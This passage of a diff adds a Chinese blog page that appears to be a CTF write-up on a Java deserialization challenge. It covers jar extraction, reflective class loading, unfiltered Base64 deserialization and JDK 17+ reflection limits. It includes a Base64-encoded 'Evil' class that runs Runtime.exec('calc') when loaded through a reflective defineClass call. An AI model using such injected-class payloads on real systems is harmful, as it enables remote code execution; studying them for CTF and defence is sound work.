+</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="p">.</span><span class="na">filter</span><span class="p">(</span><span class="n">entry</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">getName</span><span class="p">().</span><span class="na">endsWith</span><span class="p">(</span><span class="s">&#34;.class&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">entry</span><span class="p">.</span><span class="na">getName</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;META-INF&#34;</span><span class="p">))</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="p">.</span><span class="na">forEach</span><span class="p">(</span><span class="n">entry</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">               </span><span class="n">String</span><span class="w"> </span><span class="n">className</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">getName</span><span class="p">().</span><span class="na">replace</span><span class="p">(</span><span class="s">&#34;/&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;.&#34;</span><span class="p">).</span><span class="na">substring</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">entry</span><span class="p">.</span><span class="na">getName</span><span class="p">().</span><span class="na">length</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">6</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">               </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Class: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">className</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">               </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                   </span><span class="c1">// 使用 URLClassLoader 加载类  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                   </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">classLoader</span><span class="p">.</span><span class="na">loadClass</span><span class="p">(</span><span class="n">className</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                   </span><span class="c1">// 实例化类并调用方法  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                   </span><span class="n">Object</span><span class="w"> </span><span class="n">instance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">().</span><span class="na">newInstance</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                   </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">var</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getMethods</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                       </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Method name: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                       </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">method</span><span class="p">.</span><span class="na">getParameterCount</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">getReturnType</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kt">void</span><span class="p">.</span><span class="na">class</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                           </span><span class="n">Object</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">instance</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                           </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Result of &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">getName</span><span class="p">()</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">result</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                       </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                   </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">               </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">               </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">           </span><span class="p">});</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 关闭 JAR 文件  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">jar</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">classLoader</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>怀疑是不是压根就不能在jar上进行反射调用——网页搜索结果不靠谱还是AI更不靠谱？还是代码哪里写错了？</p>
+<hr>
+<hr>
+<h3 id="解析jar之后反射调用">解析JAR之后反射调用
+</h3><ul>
+<li>解析jar</li>
+<li>反射调用</li>
+</ul>
+<hr>
+<h4 id="jar解析">jar解析
+</h4><ul>
+<li><strong>创建jar文件</strong> <code>jar cf &lt;jar-file-name&gt; &lt;files&gt;</code>
+<ul>
+<li><code>c</code>：创建新的 JAR 文件。</li>
+<li><code>f</code>：指定 JAR 文件的文件名。</li>
+<li><code>&lt;jar-file&gt;</code>：生成的 JAR 文件的名字。</li>
+<li><code>&lt;files&gt;</code>：需要打包到 JAR 文件中的文件或目录。</li>
+</ul>
+</li>
+<li><strong>查看jar内容</strong> <code>jar tf myjar.jar</code></li>
+<li><strong>提取jar文件</strong> <code>jar xf &lt;jar-file&gt;</code>
+<ul>
+<li>提取指定文件 <code>jar xf &lt;jar-file&gt; &lt;target-class&gt;</code></li>
+</ul>
+</li>
+<li><strong>更新jar文件</strong> <code>jar uf &lt;jar-file&gt;&lt;files&gt;</code></li>
+<li><strong>签名jar文件</strong> <code>jar cmf &lt;manifest-file&gt; &lt;jar-file&gt; &lt;files&gt;</code>
+<ul>
+<li><code>m</code>：指定一个清单文件（manifest）。</li>
+<li><code>&lt;manifest-file&gt;</code>：包含元数据的清单文件。</li>
+<li><code>&lt;jar-file&gt;</code>：生成的 JAR 文件。</li>
+<li><code>&lt;files&gt;</code>：需要打包的文件。</li>
+</ul>
+</li>
+<li>验证jar 文件 <code>jar vf &lt;jar-file&gt;</code></li>
+</ul>
+<p>在有了上述的前置知识之后，对jar进行解析</p>
+<blockquote>
+<p>解析</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">//输出所有jar内容  
+</span></span><span class="line"><span class="cl">jar -tf .<span class="se">\J</span>DBCParty-0.0.1-SNAPSHOT.jar  
+</span></span><span class="line"><span class="cl">//解析指定的文件  
+</span></span><span class="line"><span class="cl">jar -xf .<span class="se">\J</span>DBCParty-0.0.1-SNAPSHOT.jar BOOT-INF/classes/com/example/jdbcparty/model/User.class
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>部分解析效果</strong>如下：
+<a class="link" href="https://postimg.cc/wyFm8Pk4"  target="_blank" rel="noopener"
+    ><img src="https://i.postimg.cc/mkWNMW14/image.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image.png"
+	
+	
+></a></p>
+<p>被我选中单独进行解析的类文件是 <code>User.class</code>，在后面的构造序列化数据中有重要作用</p>
+<hr>
+<p>将类文件解析出来之后，就进行下一步的反射调用</p>
+<hr>
+<h4 id="反射调用">反射调用
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ReloadAgain</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalArgumentException</span><span class="p">,</span><span class="w"> </span><span class="n">InvocationTargetException</span><span class="p">,</span><span class="w"> </span><span class="n">NoSuchMethodException</span><span class="p">,</span><span class="w"> </span><span class="n">SecurityException</span><span class="w">  </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//解析后的存放路径  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">File</span><span class="w"> </span><span class="n">classDir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="s">&#34;D:\\JavaOut_File\\BOOT-INF\\classes&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">URL</span><span class="o">[]</span><span class="w"> </span><span class="n">urls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URL</span><span class="o">[]</span><span class="w"> </span><span class="p">{</span><span class="n">classDir</span><span class="p">.</span><span class="na">toURI</span><span class="p">().</span><span class="na">toURL</span><span class="p">()};</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">URLClassLoader</span><span class="w"> </span><span class="n">classLoader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">URLClassLoader</span><span class="p">(</span><span class="n">urls</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//需要反射调用的类全称  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">class1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">classLoader</span><span class="p">.</span><span class="na">loadClass</span><span class="p">(</span><span class="s">&#34;com.example.jdbcparty.model.User&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">class1</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//根据类构造函数来构造constructor  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">constructor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">class1</span><span class="p">.</span><span class="na">getConstructor</span><span class="p">(</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//实例创建  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">user01</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">constructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="s">&#34;1234&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Wonie&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//获取方法并使用invoke执行  </span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">getUserNameMethod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">class1</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;getUsername&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="w"> </span><span class="n">getUserNameMethod</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">user01</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;Username: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">username</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">setUserNameMethod</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">class1</span><span class="p">.</span><span class="na">getMethod</span><span class="p">(</span><span class="s">&#34;setUserName&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">setUserNameMethod</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">user01</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Wonie Ruby&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个代码就终于运行成功，达到了预期的效果</p>
+<p>目前完成了反射的部分，还剩下序列化的部分，这里需要依照原jar代码文件中的序列化部分代码来进行编写——aka直接照搬。</p>
+<hr>
+<hr>
+<h2 id="序列化处理">序列化处理
+</h2><ul>
+<li>源代码中关于这部分的代码的分析</li>
+<li>如何利用</li>
+</ul>
+<hr>
+<h3 id="分析一下">分析一下
+</h3><blockquote>
+<p>源代码</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">byteArrayOutputStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutputStream</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">byteArrayOutputStream</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">byteArrayOutputStream</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">payload</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">deserialize</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">payload</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getDecoder</span><span class="p">().</span><span class="na">decode</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">data</span><span class="p">))).</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>没有什么过滤。
+由于也没有题目中的Oracle数据库的详细内容，所以后面就无法推进了。</p>
+<hr>
+<hr>
+<h2 id="重新分析">重新分析
+</h2><blockquote>
+<p>又过去几个星期，搜索了一下，有writeup了，</p>
+</blockquote>
+<p>哦呵呵完全不一样。</p>
+<h3 id="jdk-17的限制">JDK 17+的限制
+</h3><p>JDK 17 开始对java使用Strong Encapsulation，任何对<code>java.*</code>代码中的非public 变量+方法 进行反射会抛出 异常</p>
+<hr>
+<p><a class="link" href="https://pankas.top/2023/12/05/jdk17-%E5%8F%8D%E5%B0%84%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87/"  target="_blank" rel="noopener"
+    >参考</a></p>
+<blockquote>
+<p>编写一个代码进行测试</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">twoHands</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">NoSuchMethodException</span><span class="p">,</span><span class="w"> </span><span class="n">InvocationTargetException</span><span class="p">,</span><span class="w"> </span><span class="n">InstantiationException</span><span class="p">,</span><span class="w"> </span><span class="n">IllegalAccessException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">evilClassBase64</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAlFdmlsLmphdmEMAAoACwcAHQwAHgAfAQAEY2FsYwwAIAAhAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACIBAARFdmlsAQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAIAAQAKAAsAAQAMAAAAHQABAAEAAAAFKrcAAbEAAAABAA0AAAAGAAEAAAADAAgADgALAAEADAAAAFQAAwABAAAAF7gAAhIDtgAEV6cADUu7AAZZKrcAB7+xAAEAAAAJAAwABQACAA0AAAAWAAUAAAAGAAkACQAMAAcADQAIABYACgAPAAAABwACTAcAEAkAAQARAAAAAgAS&#34;</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Base64</span><span class="p">.</span><span class="na">getDecoder</span><span class="p">().</span><span class="na">decode</span><span class="p">(</span><span class="n">evilClassBase64</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ClassLoader</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredMethod</span><span class="p">(</span><span class="s">&#34;defineClass&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">byte</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">method</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">((</span><span class="n">Class</span><span class="p">)</span><span class="n">method</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">ClassLoader</span><span class="p">.</span><span class="na">getSystemClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="s">&#34;Evil&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">bytes</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">bytes</span><span class="p">.</span><span class="na">length</span><span class="p">)).</span><span class="na">newInstance</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到报错如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Exception in thread &#34;main&#34; java.lang.reflect.InaccessibleObjectException: Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int) throws java.lang.ClassFormatError accessible: module java.base does not &#34;opens java.lang&#34; to unnamed module @2e0fa5d3
+</span></span><span class="line"><span class="cl">	at java.base/java.lang.reflect.AccessibleObject.throwInaccessibleObjectException(AccessibleObject.java:388)
+</span></span><span class="line"><span class="cl">	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:364)
+</span></span><span class="line"><span class="cl">	at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:312)
+</span></span><span class="line"><span class="cl">	at java.base/java.lang.reflect.Method.checkCanSetAccessible(Method.java:203)
+</span></span><span class="line"><span class="cl">	at java.base/java.lang.reflect.Method.setAccessible(Method.java:197)
+</span></span><span class="line"><span class="cl">	at drive.tina.hotbutwsu.twoHands.main(twoHands.java:14)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>根据报错:</p>
+<ol>
+<li>试图以反射的方式，去访问<code>java.lang.ClassLoader</code>中的<code>defineClass</code>方法，该方法是<code>protected final</code>类型</li>
+<li>获得了<code>java.lang.reflect.InaccessibleObjectException</code></li>
+</ol>
+<hr>
+<h3 id="限制的原因">限制的原因
+</h3><p>在JDK 17+的版本中，上述拒绝了调用的类方法触发的方法是在<code>method.setAccessible(true); </code>这一句</p>
+<blockquote>
+<p>setAccessible()</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@CallerSensitive</span><span class="w">
